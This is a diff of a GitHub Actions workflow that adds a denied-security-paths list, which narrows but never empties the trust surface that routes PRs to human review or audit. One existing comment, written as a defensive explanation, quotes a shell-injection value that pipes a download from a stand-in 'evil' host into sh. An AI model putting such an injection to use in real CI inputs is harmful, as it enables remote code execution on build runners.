@@ -122,6 +122,7 @@ jobs:
       arm_auto_merge: ${{ steps.policy.outputs.arm_auto_merge }}
       max_review_rounds: ${{ steps.policy.outputs.max_review_rounds }}
       security_paths: ${{ steps.policy.outputs.security_paths }}
+      security_paths_denied: ${{ steps.policy.outputs.security_paths_denied }}
       unresolvable: ${{ steps.policy.outputs.unresolvable }}
     steps:
       - name: Validate dispatch inputs
@@ -562,6 +563,11 @@ jobs:
           security_paths = policy.get("security_paths", [])
           security_paths_b64 = _b64.b64encode(
               json.dumps(security_paths).encode("utf-8")).decode("ascii")
+          # [issue #459] The subtractive half rides the same way. Dropping it in transit is
+          # fail-closed by construction: an absent list resolves to the full #166 union, i.e.
+          # MORE surface guarded, never less.
+          security_paths_denied_b64 = _b64.b64encode(
+              json.dumps(policy.get("security_paths_denied", [])).encode("utf-8")).decode("ascii")
           values = {
               "routing": policy["routing"],
               "model_chain": ",".join(chain),
@@ -571,6 +577,7 @@ jobs:
               "arm_auto_merge": str(policy["arm_auto_merge"]).lower(),
               "max_review_rounds": str(policy["max_review_rounds"]),
               "security_paths": security_paths_b64,
+              "security_paths_denied": security_paths_denied_b64,
               "unresolvable": str(unresolvable).lower(),
           }
           with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
@@ -1583,6 +1590,10 @@ jobs:
           # [OPUS-4.8] B3: the target policy row's security_paths (base64 JSON list). Each path
           # becomes a --surface-path so a trust-surface diff routes its arm to a human.
           SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
+          # [issue #459] The row's security_paths_denied (base64 JSON list) — the ONLY subtractive
+          # input. Each entry becomes a --deny-surface-path; worker-pr honours it only as an exact
+          # match of a mandatory default and never down to an empty surface set.
+          SECURITY_PATHS_DENIED_B64: ${{ needs.resolve.outputs.security_paths_denied }}
           # Catalog-controlled provider reaches this job via env ONLY — never interpolated into the
           # run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
           IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
@@ -1611,6 +1622,10 @@ jobs:
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
+            | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
+          while IFS= read -r p; do
+            [[ -n "$p" ]] && args+=(--deny-surface-path "$p")
+          done < <(printf '%s' "${SECURITY_PATHS_DENIED_B64:-W10=}" | base64 -d \
             | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
           python3 registry/scripts/worker-pr.py "${args[@]}"
 
@@ -1646,6 +1661,10 @@ jobs:
           # [OPUS-4.8] B3, revised per Decision 7 (2026-07-18): the LIVE trust-surface
           # derivation now feeds the SHA-bound pre-arm AUDIT trail instead of a human park.
           SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
+          # [issue #459] The row's security_paths_denied (base64 JSON list) — the ONLY subtractive
+          # input to that derivation, bounded in worker-pr.resolve_trust_surface_paths (exact match
+          # of a mandatory default only, an explicit add wins, and never an empty surface set).
+          SECURITY_PATHS_DENIED_B64: ${{ needs.resolve.outputs.security_paths_denied }}
           # Issue #153: the routing's own security match_labels keywords (union with the builtin
           # set, resolved once above). The arm re-reads LIVE PR + source-issue labels against
           # these so a security label added DURING the review still lands in the audit trail.
@@ -1678,6 +1697,10 @@ jobs:
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
+            | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
+          while IFS= read -r p; do
+            [[ -n "$p" ]] && args+=(--deny-surface-path "$p")
+          done < <(printf '%s' "${SECURITY_PATHS_DENIED_B64:-W10=}" | base64 -d \
             | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
           while IFS= read -r k; do
             [[ -n "$k" ]] && args+=(--security-keyword "$k")
